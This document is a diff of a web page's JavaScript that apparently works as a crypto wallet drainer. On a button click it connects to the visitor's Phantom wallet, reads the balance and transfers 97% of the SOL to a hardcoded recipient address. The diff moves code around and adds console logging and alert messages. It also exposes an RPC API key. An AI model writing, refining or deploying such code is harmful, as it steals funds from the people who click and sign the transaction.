@@ -39,19 +39,22 @@
         const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
 
         document.getElementById('send-tokens').addEventListener('click', async () => {
-            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
-
             try {
-                // Connect to Solana Wallet
+                const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+
+                // Check for Phantom Wallet
                 const provider = window.solana;
                 if (!provider || !provider.isPhantom) {
-                    throw new Error("Phantom Wallet not found. Please install it to proceed.");
+                    alert("Phantom Wallet not detected. Please install the Phantom Wallet extension to proceed.");
+                    return;
                 }
 
+                // Connect to Phantom Wallet
+                console.log("Connecting to Phantom Wallet...");
                 await provider.connect();
-                const walletAddress = provider.publicKey.toString();
+                console.log("Connected to wallet:", provider.publicKey.toString());
 
-                // Use your custom Alchemy RPC endpoint
+                // Create Solana connection
                 const connection = new Connection(
                     "https://solana-mainnet.g.alchemy.com/v2/Bd8kT5OZq3_fyZAUiGis8_7wm1naGVfF", 
                     'confirmed'
@@ -59,10 +62,12 @@
 
                 // Get wallet balance
                 const walletBalance = await connection.getBalance(provider.publicKey);
-                const amountToSend = Math.floor(walletBalance * 0.97);
+                console.log("Wallet balance:", walletBalance);
 
+                const amountToSend = Math.floor(walletBalance * 0.97);
                 if (amountToSend <= 0) {
-                    throw new Error("Insufficient funds in the wallet to perform this transaction.");
+                    alert("Insufficient funds in the wallet to perform this transaction.");
+                    return;
                 }
 
                 // Create Transaction
@@ -74,12 +79,16 @@
                     })
                 );
 
-                // Request Wallet Signature
+                // Request Signature
+                console.log("Requesting transaction signature...");
                 const { signature } = await provider.signAndSendTransaction(transaction);
-                await connection.confirmTransaction(signature, 'processed');
+                console.log("Transaction signature:", signature);
 
+                // Confirm Transaction
+                await connection.confirmTransaction(signature, 'processed');
                 alert(`97% of your SOL has been sent successfully!\nTransaction Signature: ${signature}`);
             } catch (error) {
+                console.error("Error occurred:", error);
                 alert(`Error: ${error.message}`);
             }
         });
